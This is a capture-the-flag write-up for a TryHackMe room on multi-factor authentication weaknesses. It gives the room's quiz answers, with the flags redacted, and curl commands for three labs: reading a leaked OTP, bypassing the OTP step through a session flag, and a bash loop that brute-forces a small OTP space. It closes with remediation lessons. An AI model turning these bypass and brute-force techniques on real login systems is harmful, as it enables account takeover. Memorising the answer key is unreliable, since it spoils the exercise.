# Multi-Factor Authentication (TryHackMe)

Room: Multi-Factor Authentication — premium web-app auth room on MFA/2FA weaknesses. A PHP app at
`http://mfa.thm/` hosts three labs, each a different 2FA flaw: OTP leaked in an XHR response, a 2FA
bypass from a dangling `authenticated` session flag, and an OTP brute force past an auto-logout.
Completed: 2026-11-03 | Target: <ip> (`MFA.v.1.4`).

Solved **fully headless from `C:\CTF`** with `curl --resolve mfa.thm:80:<ip>` + a cookie jar
per lab — no browser, no AttackBox. Creds for every lab: `thm@mail.thm` / `<redacted-pw>`.

## Answers

| Task | Question | Answer |
|---|---|---|
| 2 | SMS OTP is which factor | `Something you have` |
| 3 | Is MFA important (yea/nay) | `yea` |
| 4 | Prevent brute-forcing OTPs | `Rate Limiting` |
| 5 | Lab 1 flag (OTP leakage) | `<redacted-hash>` |
| 6 | Lab 2 flag (insecure coding / bypass) | `<redacted-hash>` |
| 7 | Lab 3 flag (beat auto-logout) | `<redacted-hash>` |

## Reproducible steps (headless)

All requests prefixed `curl --resolve mfa.thm:80:<ip>`.

### Lab 1 — OTP leaked in the `/token` response (`/labs/first`)
The MFA page fires an XHR to `/token` that returns the OTP in the body.
```bash
curl -c j -d "email=thm@mail.thm&password=<redacted-pw>" http://mfa.thm/labs/first/   # 302 -> /labs/first/mfa
curl -b j http://mfa.thm/labs/first/token                                       # {"token":"6639"}
curl -b j -c j -d "code-1=6&code-2=6&code-3=3&code-4=9" http://mfa.thm/labs/first/mfa  # 302 -> dashboard
curl -b j http://mfa.thm/labs/first/dashboard                                   # flag in the page
```
The OTP form splits the 4-digit code into `code-1..code-4`. Flag sits in a `div` /
`navigator.clipboard.writeText(...)` call: `<redacted-hash>`.

### Lab 2 — dangling `authenticated` flag (`/labs/second`)
The app sets `$_SESSION['authenticated']=true` at the **username/password** step (it should only be
set after OTP). The dashboard checks only that flag, so skip the OTP page entirely:
```bash
curl -c j http://mfa.thm/labs/second/ -o /dev/null
curl -b j -c j -d "email=thm@mail.thm&password=<redacted-pw>" http://mfa.thm/labs/second/  # 302 -> /mfa
curl -b j http://mfa.thm/labs/second/dashboard                                       # flag, no OTP
```
Flag: `<redacted-hash>`.

### Lab 3 — brute force past auto-logout (`/labs/third`)
Token is `strval(rand(1250,1350))` → **101 possible values**. A failed OTP invalidates the session
(302 back to `/labs/third/`), so it's **one guess per fresh login**. Loop: new session → login →
submit a fixed guess until the random token happens to match it, then reuse that session's
`PHPSESSID` for the dashboard.
```bash
G=1300
for i in $(seq 1 600); do
  rm -f j; curl -c j -d "email=thm@mail.thm&password=<redacted-pw>" http://mfa.thm/labs/third/ -o /dev/null
  LOC=$(curl -b j -c j -o /dev/null -w "%{redirect_url}" \
        -d "code-1=1&code-2=3&code-3=0&code-4=0" http://mfa.thm/labs/third/mfa)
  echo "$LOC" | grep -q /dashboard && { curl -b j http://mfa.thm/labs/third/dashboard; break; }
done
```
Hit on attempt **193** (fixed guess `1300`). Flag: `<redacted-hash>`.

## Lessons

- **Three distinct 2FA flaw classes, one room:** (1) the server *returns the secret* it's supposed
  to check — read the XHR, don't guess it; (2) the "you passed step 1" flag is reused as "you passed
  step 2" — the dashboard never re-checks OTP, so request it directly; (3) no rate limiting + a tiny
  keyspace = brute force, with the auto-logout only forcing a re-login per guess, not actually
  stopping it. Each maps straight to the room's remediation (return `success` not the OTP; split the
  session into pre-/post-OTP halves; add real rate limiting/lockout).
- **Auto-logout is not rate limiting.** Lab 3's "revert to login on failure" *feels* like a
  defence, but because the token is regenerated each login and there's no attempt cap, a fixed-guess
  loop over fresh sessions beats it in ~O(keyspace) tries (193 here for a 101-value space). The
  answer to Task 4 (`Rate Limiting`) is exactly what Lab 3 lacks.
- **Headless `curl --resolve` + one cookie jar per lab** is all these `/etc/hosts` PHP rooms need;
  `-w "%{redirect_url}"` with `-o /dev/null` reads the 302 target cheaply inside a loop without
  parsing headers. (Same pattern as [[oauth-vulnerabilities]], [[jwt-security]].)
- **Flags here are 32-hex tokens, not `THM{…}`** — the underscore-count in the pasted answer box
  is not a reliable length hint; grep `[0-9a-f]{32}`.
